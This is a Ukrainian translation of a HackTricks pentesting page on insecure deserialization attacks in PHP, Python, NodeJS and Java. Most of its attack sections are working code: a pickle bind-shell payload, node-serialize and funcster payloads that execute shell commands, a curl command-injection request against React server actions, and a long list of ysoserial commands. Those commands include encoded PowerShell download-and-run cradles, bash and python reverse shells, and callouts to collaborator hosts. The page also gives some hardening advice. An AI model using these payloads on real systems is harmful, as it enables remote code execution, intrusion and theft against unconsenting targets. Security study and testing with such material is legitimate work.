# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

**Serialization** розуміється як метод перетворення об'єкта в формат, який можна зберегти, з метою або зберігання об'єкта, або передачі його в рамках комунікації. Цей прийом зазвичай застосовується, щоб забезпечити можливість відтворення об'єкта пізніше, збереження його структури та стану.

**Deserialization**, навпаки, — це процес, що протистоїть serialization. Він полягає в прийомі даних, структурованих у певному форматі, і відтворенні їх назад в об'єкт.

Deserialization може бути небезпечною, бо вона потенційно **дозволяє зловмисникам маніпулювати серіалізованими даними для виконання шкідливого коду** або викликати непередбачену поведінку в застосунку під час процесу відтворення об'єкта.

## PHP

У PHP під час процесів serialization та deserialization використовуються специфічні магічні методи:

- `__sleep`: Викликається, коли об'єкт серіалізується. Цей метод має повертати масив імен усіх властивостей об'єкта, які повинні бути серіалізовані. Зазвичай його використовують для збереження відкладених даних або виконання подібних операцій очищення.
- `__wakeup`: Викликається при deserialization об'єкта. Використовується для відновлення з'єднань з базою даних, які могли бути втрачені під час serialization, та для виконання інших задач повторної ініціалізації.
- `__unserialize`: Цей метод викликається замість `__wakeup` (якщо він існує) під час deserialization об'єкта. Він дає більше контролю над процесом deserialization у порівнянні з `__wakeup`.
- `__destruct`: Цей метод викликається, коли об'єкт збираються знищити або коли скрипт завершує роботу. Зазвичай використовується для задач очищення, наприклад закриття файлових дескрипторів або з'єднань з базою даних.
- `__toString`: Цей метод дозволяє трактувати об'єкт як рядок. Його можна використовувати для читання файлу або інших операцій на основі викликів функцій всередині нього, фактично забезпечуючи текстове представлення об'єкта.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Якщо подивитися на результати, можна побачити, що функції **`__wakeup`** та **`__destruct`** викликаються під час десеріалізації об'єкта. Зверніть увагу, що в кількох підручниках ви знайдете, що функція **`__toString`** викликається при спробі вивести якийсь атрибут, але, здається, це **більше не відбувається**.

> [!WARNING]
> Метод **`__unserialize(array $data)`** викликається **замість `__wakeup()`**, якщо він реалізований у класі. Він дозволяє десеріалізувати об'єкт, передаючи серіалізовані дані у вигляді масиву. Ви можете використовувати цей метод для десеріалізації властивостей і виконання необхідних дій під час десеріалізації.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Ви можете прочитати пояснений приклад **PHP** тут: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), тут [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) або тут [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Десеріалізація + Автозавантаження класів

Ви можете зловживати функціональністю autoload у PHP, щоб завантажувати довільні php-файли та інше:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Серіалізація посилань на значення

Якщо з якоїсь причини ви хочете серіалізувати значення як **посилання на інше серіалізоване значення**, ви можете:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Запобігання PHP Object Injection за допомогою `allowed_classes`

> [!INFO]
> Підтримка **другого аргументу** функції `unserialize()` (масив `$options`) була додана в **PHP 7.0**. У старіших версіях функція приймає лише серіалізований рядок, що унеможливлює обмежити, які класи можуть бути інстанційовані.
  
`unserialize()` буде **інстанціювати кожен клас**, який знайде в серіалізованому потоці, якщо не вказано інше. Починаючи з PHP 7 поведінку можна обмежити опцією [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Якщо **`allowed_classes` опущено _або_ код виконується на PHP < 7.0**, виклик стає **небезпечним**, оскільки атакуючий може створити payload, який зловживає магічними методами, такими як `__wakeup()` або `__destruct()`, щоб досягти Remote Code Execution (RCE).

#### Реальний приклад: Everest Forms (WordPress) CVE-2025-52709

Плагін WordPress **Everest Forms ≤ 3.2.2** намагався діяти оборонно за допомогою допоміжної обгортки, але забув про застарілі версії PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
На серверах, які все ще працювали на **PHP ≤ 7.0**, ця друга гілка призводила до класичної **PHP Object Injection**, коли адміністратор відкривав шкідливе відправлення форми. Мінімальний exploit payload міг виглядати так:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Як тільки admin переглянув запис, об'єкт був інстанційований і `SomeClass::__destruct()` було виконано, в результаті — arbitrary code execution.

**Висновки**
1. Завжди передавайте `['allowed_classes' => false]` (або строгий білий список) при виклику `unserialize()`.
2. Аудитуйте defensive wrappers – вони часто забувають про legacy PHP branches.
3. Оновлення лише до **PHP ≥ 7.x** недостатнє: опція все ще має бути вказана явно.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) може допомогти згенерувати payloads для зловживання PHP deserializations.\
Зауважте, що в декількох випадках ви **не зможете знайти спосіб зловживання deserialization в коді додатку**, але можете **зловживати кодом зовнішніх PHP extensions.**\
Тому, якщо можете, перевірте `phpinfo()` сервера та **пошукайте в інтернеті** (і навіть у **gadgets** **PHPGGC**) можливі gadgets, якими можна зловживати.

### phar:// metadata deserialization

Якщо ви знайшли LFI, який лише читає файл і не виконує PHP код всередині нього, наприклад, використовуючи функції як _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Ви можете спробувати зловживати **deserialization**, що відбувається при **читанні** **файлу** з використанням протоколу **phar**.\
Для додаткової інформації читайте наступну статтю:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Коли об'єкт проходить unpickle, буде виконано функцію \_\_\_reduce\_\_\_.\
При експлуатації сервер може повернути помилку.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Перед перевіркою техніки обходу, спробуйте використати `print(base64.b64encode(pickle.dumps(P(),2)))` щоб згенерувати об'єкт, сумісний з python2, якщо ви запускаєте python3.

Для детальнішої інформації про втечу з **pickle jails** дивіться:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Наступна сторінка описує техніку для **abuse an unsafe deserialization in yamls python libraries** і завершується інструментом, який можна використати для генерування RCE deserialization payload для **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
If abusing a deserialization you can **compromise these functions to execute other code** (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Якщо ви хочете дізнатися про цю техніку **перегляньте наступний підручник**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ця бібліотека дозволяє серіалізувати функції. Приклад:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**серіалізований об'єкт** виглядатиме так:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Як видно з прикладу, коли функція serialized, до serialized object додається прапорець `_$$ND_FUNC$$_`.

У файлі `node-serialize/lib/serialize.js` можна знайти той самий прапорець і побачити, як код його використовує.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Як видно в останньому фрагменті коду, **якщо прапорець знайдено** `eval` використовується для десеріалізації функції, тож по суті **user input використовується всередині функції `eval`**.

Однак, **just serialising** a function **won't execute it** оскільки для цього потрібно, щоб якась частина коду в нашому прикладі була **calling `y.rce`**, а це вкрай **малоймовірно**.\
В будь-якому разі, ви можете просто **modify the serialised object** **adding some parenthesis** щоб автоматично виконати the serialized function коли the object is deserialized.\
У наступному фрагменті коду **зверніть увагу на останню дужку** і як функція `unserialize` автоматично виконає код:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Як уже було зазначено, ця бібліотека отримає код після `_$$ND_FUNC$$_` і **виконає його** за допомогою `eval`. Отже, щоб **автоматично виконати код**, ви можете **видалити частину створення функції** та останню дужку і **просто виконати JS oneliner** як у наступному прикладі:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Ви можете [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **further information** про те, як експлуатувати цю уразливість.

### [funcster](https://www.npmjs.com/package/funcster)

Важливою особливістю **funcster** є недоступність **стандартних вбудованих об'єктів**; вони перебувають поза доступною областю. Це обмеження перешкоджає виконанню коду, який намагається викликати методи вбудованих об'єктів, що призводить до винятків на кшталт `"ReferenceError: console is not defined"` при використанні команд типу `console.log()` або `require(something)`.

Незважаючи на це обмеження, відновити повний доступ до глобального контексту, включно з усіма стандартними вбудованими об'єктами, можна за допомогою специфічного підходу. Використовуючи глобальний контекст безпосередньо, можна обійти це обмеження. Наприклад, доступ можна відновити за допомогою наступного фрагмента:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Для**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Пакет **serialize-javascript** призначений виключно для цілей serialization і не містить жодних вбудованих можливостей для deserialization. Користувачі самі відповідають за реалізацію власного методу deserialization. В офіційному прикладі для deserializing serialized data пропонується пряме використання `eval`:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Якщо ця функція використовується для deserialize objects, ви можете **easily exploit it**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Для**[ **докладніше читайте це джерело**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

На наступних сторінках можна знайти інформацію про те, як зловживати цією бібліотекою для виконання довільних команд:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

### React Server Components / react-server-dom-webpack Server Actions Abuse (CVE-2025-55182)

React Server Components (RSC) покладаються на `react-server-dom-webpack` (RSDW) для декодування server action submissions, що надсилаються як `multipart/form-data`. Кожна відправка action містить:

- `$ACTION_REF_<n>` частини, які посилаються на викликаємий action.
- `$ACTION_<n>:<m>` частини, тіло яких — JSON, наприклад `{"id":"module-path#export","bound":[arg0,arg1,...]}`.

У версії **19.2.0** хелпер `decodeAction(formData, serverManifest)` беззастережно довіряє як **рядку `id`** (визначає, який експорт модуля викликати), так і **масиву `bound`** (аргументи). Якщо атакуючий може дістатися до endpoint, який пересилає запити в `decodeAction`, він може викликати будь-який експортований server action з параметрами, контрольованими атакуючим, навіть без React front-end (CVE-2025-55182). Повний рецепт:

1. **Дізнатися identifier action.** Bundle output, error traces or leaked manifests зазвичай виявляють рядки на кшталт `app/server-actions#generateReport`.
2. **Відтворити multipart payload.** Сформуйте частину `$ACTION_REF_0` та JSON-тіло `$ACTION_0:0`, яке містить identifier і довільні аргументи.
3. **Дозволити `decodeAction` його обробити.** Хелпер вирішує модуль із `serverManifest`, імпортує експорт і повертає викликаний об’єкт, який сервер одразу виконує.

Example payload hitting `/formaction`:
```http
POST /formaction HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_REF_0"

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------BOUNDARY--
```
Або за допомогою curl:
```bash
curl -sk -X POST http://target/formaction \
-F '$ACTION_REF_0=' \
-F '$ACTION_0:0={"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}'
```
Масив `bound` безпосередньо наповнює параметри server-action. У вразливій лабораторії гаджет виглядає так:
```javascript
const { exec } = require("child_process");
const util = require("util");
const pexec = util.promisify(exec);

async function generateReport(project, format) {
const cmd = `node ./scripts/report.js --project=${project} --format=${format}`;
const { stdout } = await pexec(cmd);
return stdout;
}
```
Подача `format = "pdf & whoami"` змушує `/bin/sh -c` виконати легітимний генератор звітів, а потім `whoami`, причому обидва виводи надсилаються всередині JSON action response. Будь-яку server action, яка обгортає filesystem primitives, database drivers або інші інтерпретатори, можна зловживати тим самим, щойно атакуючий контролює `bound` дані.

Атакуючому ніколи не потрібен реальний React client — будь-який HTTP інструмент, що відправляє multipart у формі `$ACTION_*`, може напряму викликати server actions і передати отриманий JSON-вивід у RCE primitive.

## Java - HTTP

У Java, **deserialization callbacks виконуються в процесі deserialization**. Цю поведінку можуть використовувати атакуючі, які формують шкідливі payloads, що тригерять ці callbacks, призводячи до потенційного виконання шкідливих дій.

### Fingerprints

#### White Box

Щоб виявити потенційні serialization vulnerabilities у кодовій базі, шукайте:

- Класи, які реалізують інтерфейс `Serializable`.
- Використання `java.io.ObjectInputStream`, функцій `readObject`, `readUnshare`.

Зверніть особливу увагу на:

- `XMLDecoder`, що використовується з параметрами, визначеними зовнішніми користувачами.
- Метод `fromXML` у `XStream`, особливо якщо версія XStream менша або рівна 1.46, оскільки вона піддається serialization issues.
- `ObjectInputStream` у поєднанні з методом `readObject`.
- Реалізації методів на кшталт `readObject`, `readObjectNoData`, `readResolve` або `readExternal`.
- `ObjectInputStream.readUnshared`.
- Загальне використання `Serializable`.

#### Black Box

Для black box тестування шукайте специфічні **signatures або "Magic Bytes"**, які позначають java serialized objects (походження від `ObjectInputStream`):

- Шістнадцятковий патерн: `AC ED 00 05`.
- Base64 патерн: `rO0`.
- HTTP response headers з `Content-type`, встановленим на `application/x-java-serialized-object`.
- Шістнадцятковий патерн, що вказує на попередню компресію: `1F 8B 08 00`.
- Base64 патерн, що вказує на попередню компресію: `H4sIA`.
- Web файли з розширенням `.faces` та параметром `faces.ViewState`. Виявлення цих патернів у веб-застосунку має спонукати до перевірки, як детально описано у [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Перевірка на вразливість

Якщо ви хочете дізнатися, як працює **Java Deserialized exploit**, перегляньте [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), та [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization and pre-auth reachability

Сучасні кодові бази іноді обгортають десеріалізацію у `java.security.SignedObject` і перевіряють підпис перед викликом `getObject()` (який десеріалізує внутрішній об'єкт). Це ускладнює використання довільних top-level gadget classes, але все ще може бути експлуатовано, якщо атакуючий отримає дійсний підпис (наприклад, private-key compromise або signing oracle). Крім того, механізми обробки помилок можуть створювати session-bound tokens для неавторизованих користувачів, відкриваючи доступ до захищених sinks pre-auth.

Для конкретного кейсу з запитами, IoCs та рекомендаціями щодо hardening дивіться:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Ви можете перевірити, чи встановлено будь-який додаток з відомими вразливостями.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Ви можете спробувати **перевірити всі бібліотеки**, відомі як вразливі, для яких [**Ysoserial**](https://github.com/frohoff/ysoserial) може надати експлойт. Або ви можете перевірити бібліотеки, вказані в [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Ви також можете використати [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) для пошуку можливих gadget chains, які можна експлуатувати.\
При запуску **gadgetinspector** (після збірки) не звертайте уваги на велику кількість попереджень/помилок і дочекайтеся завершення. Він запише всі знахідки у _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Зверніть увагу, що **gadgetinspector не створює експлойт і може показувати false positives**.

#### Black Box Test

Використовуючи розширення Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), ви можете ідентифікувати **які бібліотеки доступні** (і навіть їхні версії). З цією інформацією може бути **легше обрати payload** для експлуатації вразливості.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe зосереджений на **`ObjectInputStream` deserializations**.

Використовуючи розширення Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), ви можете **виявити вразливі бібліотеки**, які можна експлуатувати за допомогою ysoserial, та **експлуатувати** їх.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner зосереджений на **`ObjectInputStream`** deserializations.

Ви також можете використати [**Freddy**](https://github.com/nccgroup/freddy) для **виявлення deserializations** вразливостей у **Burp**. Цей плагін виявляє **не лише `ObjectInputStream`** пов'язані вразливості, але **також** вразливості у бібліотеках десеріалізації **Json** та **Yml**. В активному режимі він намагатиметься підтвердити їх за допомогою sleep або DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Не все зводиться до перевірки, чи використовує сервер вразливу бібліотеку. Іноді ви можете **змінити дані всередині serialized object і обійти деякі перевірки** (можливо отримати адміністративні привілеї всередині webapp).\
Якщо ви знайдете java serialized object, що надсилається у веб-застосунок, **ви можете використати** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **щоб у більш читабельному форматі вивести serialized object, який надсилається**. Знаючи, які дані ви відправляєте, буде легше їх змінити і обійти деякі перевірки.

### **Exploit**

#### **ysoserial**

Головний інструмент для експлуатації Java deserializations — [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Ви також можете розглянути використання [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), який дозволить вам використовувати складні команди (наприклад з pipes).\
Зверніть увагу, що цей інструмент **орієнтований** на експлуатацію **`ObjectInputStream`**.\
Я б **почав із використання payload "URLDNS"** перед RCE payload, щоб перевірити, чи можливий інжекшн. У будь-якому разі майте на увазі, що payload "URLDNS" може не працювати, але інший RCE payload — так.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
При створенні payload для **java.lang.Runtime.exec()** ви **не можете використовувати спеціальні символи** як ">" або "|" для перенаправлення виводу виконання, "$()" для виконання команд або навіть **передавати аргументи** команді, розділені **пробілами** (ви можете зробити `echo -n "hello world"` але не можете зробити `python2 -c 'print "Hello world"'`). Щоб правильно закодувати payload ви можете [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Не соромтеся використовувати наступний скрипт для створення **all the possible code execution** payloads для Windows і Linux і потім протестувати їх на вразливій веб-сторінці:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Ви можете **використовувати** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **разом із ysoserial для створення більшої кількості exploits**. Більше інформації про цей інструмент — у **слайдах доповіді**, де інструмент був представлений: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)можна використовувати для генерації payloads з метою exploit різних **Json** та **Yml** serialization бібліотек у Java.\
Щоб скомпілювати проект, мені потрібно було **додати** ці **залежності** до `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Встановіть maven**, і **скомпілюйте** проект:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

